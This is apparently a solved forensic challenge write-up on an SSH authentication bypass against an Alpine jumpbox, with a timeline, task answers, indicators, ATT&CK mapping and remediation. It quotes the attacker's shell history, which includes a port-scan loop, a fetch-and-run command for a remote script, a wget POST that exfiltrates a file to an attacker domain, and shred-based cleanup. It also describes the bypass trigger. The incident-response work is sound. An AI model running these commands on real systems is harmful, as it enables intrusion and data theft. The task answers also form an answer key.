<img src="Images/SSHole%20-%20Logo.png">

# Timeline

|Timestamp (server time)|Event|Source|
|---|---|---|
|2026-11-06 11:27:05|Failed password attempt for `adminsvc` from `192.168.72.1` (port 61351, session PID 4852)|`var/log/messages`|
|2026-11-06 11:27:08|Accepted password for `adminsvc` from `192.168.72.1` in the same session: authentication bypass via CVE-2026-123158 (**initial access**)|`var/log/messages`|
|_(1)_|Local reconnaissance of the home directory (`ls -la`)|`.ash_history`|
|_(1)_|Port scan of the internal network `192.168.18.0/24` (ports 1-65535) with `nc`|`.ash_history`|
|_(1)_|Scan results written to `scanreport.txt` with `vi`|`.ash_history`, `home/adminsvc/scanreport.txt`|
|_(1)_|Download and execution of `setup.sh` from GitHub (`papinyurii33/devscripts`)|`.ash_history`|
|_(1)_|Inspection of the hidden file `/tmp/.devenv`|`.ash_history`|
|_(1)_|Exfiltration of `/tmp/.devenv` via an HTTPS POST to `devv.coding.eu/process`|`.ash_history`|
|_(1)_|Secure deletion of `/tmp/.devenv` with `shred -u` (anti-forensics)|`.ash_history`|
|2026-11-06 12:20:02|Attacker logs out (`exit`): end of the SSH session from `192.168.72.1` (same source port 61351)|`.ash_history`, `var/log/messages`|

_(1) The `ash` history file does not record timestamps: these events happened between 11:27:08 and 12:20:02, in the order shown. The attacker was connected for about 53 minutes._

---
# Table of Contents

- [Introduction](#introduction)
	- [Scenario](#scenario)
	- [Artefacts](#artefacts)
- [Tasks](#tasks)
	- [Task 1](#task-1)
	- [Task 2](#task-2)
	- [Task 3](#task-3)
	- [Task 4](#task-4)
	- [Task 5](#task-5)
	- [Task 6](#task-6)
	- [Task 7](#task-7)
- [Indicators of Compromise](#indicators-of-compromise)
- [MITRE ATT&CK](#mitre-attck)
- [Remediation](#remediation)

---
# Introduction

## Scenario

> Suspicious traffic was observed from a misconfigured jumpbox to a suspicious domain. You have been provided with evidence pulled from the jumpbox server. Determine how the attackers gained access to the server and what activity they performed afterwards.

## Artefacts

We started the Sherlock with the `SSHole.zip` file. It contained several Linux files and directories pulled from the jumpbox, which were useful for our investigation.

# Tasks

## Task 1

**What Linux distribution name and version was the targeted server running?**

Once we extracted the archive, we identified the Linux distribution and version by reading the `os-release` file.

```
cat etc/os-release

NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.3
PRETTY_NAME="Alpine Linux v3.24"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
```

The server was running Alpine Linux, version 3.24.3.

**ANSWER**: `Alpine Linux 3.24.3`

## Task 2

**What is the CVE ID of the vulnerability abused by the attacker to gain access?**

The name of the Sherlock is a reference to the `sshhole` vulnerability, which allows an attacker to authenticate over SSH as a disabled account (an account with `*` in its password field in `/etc/shadow`) by supplying any password between 257 and 1024 characters long.

The ID of this CVE is `CVE-2026-123158`.

**ANSWER**: `CVE-2026-123158`

## Task 3

**When did the attacker exploit the vulnerability?**

To identify the exploitation of the CVE, we looked for a failed password attempt quickly followed by an accepted one.

In the logs, we identified that the IP `192.168.72.131` belonged to the jumpbox itself, and that another IP, `192.168.72.1`, successfully authenticated over SSH at `2026-11-06 11:27:08`. Both entries belong to the same SSH session (PID `4852`, source port `61351`), with only three seconds between the failure and the success.

```
cat var/log/messages

<SNIP>

Nov  6 11:27:05 dev-jumpbox auth.info sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2

<SNIP>
```

We could also follow the whole session and identify when the attacker logged out: `adminsvc` disconnected at `2026-11-06 12:20:02`, about 53 minutes after the initial access.

```
cat var/log/messages

<SNIP>

Nov  6 12:20:02 dev-jumpbox auth.info sshd-session[4854]: Received disconnect from 192.168.72.1 port 61351:11: disconnected by user
Nov  6 12:20:02 dev-jumpbox auth.info sshd-session[4854]: Disconnected from user adminsvc 192.168.72.1 port 61351

<SNIP>
```

**ANSWER**: `2026-11-06 11:27:08`

## Task 4

**Which user account was abused by the attacker?**

From the same log entries, we identified `adminsvc` as the account used by the attacker to log in over SSH.

**ANSWER**: `adminsvc`

## Task 5

**What string value causes the authentication bypass?**

As described in Task 2, the `*` value in the password field of `/etc/shadow`, which marks a disabled account, is what causes the authentication bypass.

**ANSWER**: `*`

## Task 6

**What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?**

We identified the command used by the attacker to scan the internal network reachable from the jumpbox by reading the shell history of `adminsvc`, stored in `.ash_history` (Alpine uses BusyBox `ash` as its default shell).

```
cat home/adminsvc/.ash_history

ls -la
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
vi scanreport.txt
cat scanreport.txt
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
ls -la /tmp
ls -l /tmp/.devenv
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
exit
```

The attacker also left the scan results in the home directory.

```
ls home/adminsvc

scanreport.txt
```

**ANSWER**: `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`

## Task 7

**What was the exfiltration URI where the attacker exfiltrated a sensitive file?**

In `.ash_history`, we identified a POST request sent with `wget` to `https://devv.coding.eu/process`. The attacker used it to exfiltrate `/tmp/.devenv`, a hidden file most likely created by the `setup.sh` script downloaded from GitHub just before. The attacker then securely deleted the file with `shred -u` to cover their tracks.

**ANSWER**: `https://devv.coding.eu/process`

# Indicators of Compromise

| Type           | Indicator                                                                              | Description                                                   |
| -------------- | -------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| IPv4 address   | `192.168.72.1`                                                                         | Source IP of the attacker's SSH connection                    |
| User account   | `adminsvc`                                                                             | Disabled account abused through the authentication bypass     |
| URL            | `hxxps://raw.githubusercontent[.]com/papinyurii33/devscripts/refs/heads/main/setup.sh` | Malicious script downloaded and executed on the jumpbox       |
| GitHub account | `papinyurii33`                                                                         | Account hosting the malicious `devscripts` repository         |
| Domain         | `devv[.]coding[.]eu`                                                                   | Attacker-controlled domain used for exfiltration              |
| URL            | `hxxps://devv[.]coding[.]eu/process`                                                   | Exfiltration endpoint (HTTPS POST)                            |
| File path      | `/tmp/.devenv`                                                                         | Hidden file staged, exfiltrated, then deleted with `shred -u` |
| File path      | `/home/adminsvc/scanreport.txt`                                                        | Results of the internal network scan                          |
| Command line   | `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 ...`                          | Port scan of the internal developer network 192.168.18.0/24   |

# MITRE ATT&CK

|Tactic|Technique ID|Technique|Evidence|
|---|---|---|---|
|Resource Development|[T1608.001](https://attack.mitre.org/techniques/T1608/001/)|Stage Capabilities: Upload Malware|`setup.sh` hosted in the GitHub repository `papinyurii33/devscripts`|
|Initial Access|[T1190](https://attack.mitre.org/techniques/T1190/)|Exploit Public-Facing Application|Exploitation of CVE-2026-123158 on the jumpbox's SSH service|
|Initial Access, Persistence|[T1078.003](https://attack.mitre.org/techniques/T1078/003/)|Valid Accounts: Local Accounts|Login as the disabled local account `adminsvc`|
|Discovery|[T1046](https://attack.mitre.org/techniques/T1046/)|Network Service Discovery|`nc` port scan of `192.168.18.0/24`|
|Command and Control|[T1105](https://attack.mitre.org/techniques/T1105/)|Ingress Tool Transfer|`wget` download of `setup.sh`|
|Execution|[T1059.004](https://attack.mitre.org/techniques/T1059/004/)|Command and Scripting Interpreter: Unix Shell|`bash <(wget -qO- .../setup.sh)`|
|Collection|[T1074.001](https://attack.mitre.org/techniques/T1074/001/)|Data Staged: Local Data Staging|Data staged in `/tmp/.devenv` before exfiltration|
|Defense Evasion|[T1564.001](https://attack.mitre.org/techniques/T1564/001/)|Hide Artifacts: Hidden Files and Directories|Dot-prefixed file `/tmp/.devenv`|
|Exfiltration|[T1048.002](https://attack.mitre.org/techniques/T1048/002/)|Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol|`wget --post-file=/tmp/.devenv` to `https://devv.coding.eu/process`|
|Defense Evasion|[T1070.004](https://attack.mitre.org/techniques/T1070/004/)|Indicator Removal: File Deletion|`shred -u /tmp/.devenv`|

# Remediation

| Priority   | Area           | Action                                                                                                                                                      | Purpose                                                                           |
| ---------- | -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| Immediate  | Containment    | Isolate the jumpbox and rebuild it from a known-good image                                                                                                  | The host is compromised and the attacker ran an unknown script on it              |
| Immediate  | Patching       | Upgrade the affected package to the fixed version (`apk update && apk upgrade`)                                                                             | Remove the CVE-2026-123158 authentication bypass                                  |
| Immediate  | Credentials    | Rotate every secret that may have been stored in `/tmp/.devenv`, as well as the jumpbox's SSH host and user keys                                            | The content of the exfiltrated file is unknown and must be considered compromised |
| Immediate  | Blocking       | Block the IoCs (`devv.coding.eu`, the GitHub URL) at the DNS, proxy and firewall levels                                                                     | Prevent any further download or exfiltration                                      |
| Short term | Threat hunting | Review connections from the jumpbox to the `192.168.18.0/24` developer hosts                                                                                | The attacker mapped this network and may have moved laterally                     |
| Hardening  | Accounts       | Audit `/etc/shadow`; lock or remove unused accounts (`passwd -l`) and set service accounts' shell to `/sbin/nologin`                                        | Disabled accounts must not be usable for an interactive login                     |
| Hardening  | SSH            | Enforce key-based authentication (`PasswordAuthentication no`), restrict users with `AllowUsers`/`AllowGroups` and limit allowed source IPs                 | Reduce the SSH attack surface of the jumpbox                                      |
| Hardening  | Network        | Filter the jumpbox's outbound traffic (allow-list only) and limit its access to the developer network to the required ports                                 | Block internet downloads/exfiltration and full-range internal scans               |
| Detection  | Logging        | Forward logs to a central SIEM, enable command auditing with timestamps (e.g. `auditd`), and alert on a failed→accepted login sequence for service accounts | Detect a similar attack earlier and keep reliable evidence off the host           |

![SSHole - solved](Images/SSHole%20-%20solved.png)
